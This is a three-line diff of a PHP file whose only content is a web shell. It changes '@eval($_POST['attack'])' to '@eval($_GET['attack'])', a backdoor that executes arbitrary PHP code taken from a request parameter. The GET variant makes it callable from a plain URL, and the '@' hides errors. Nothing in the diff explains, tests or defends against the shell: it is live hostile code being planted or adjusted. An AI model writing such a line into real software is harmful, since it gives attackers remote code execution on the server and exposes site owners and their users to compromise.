@@ -1,3 +1,3 @@
 <?
-  @eval($_POST['attack']);
+  @eval($_GET['attack']);
 ?>
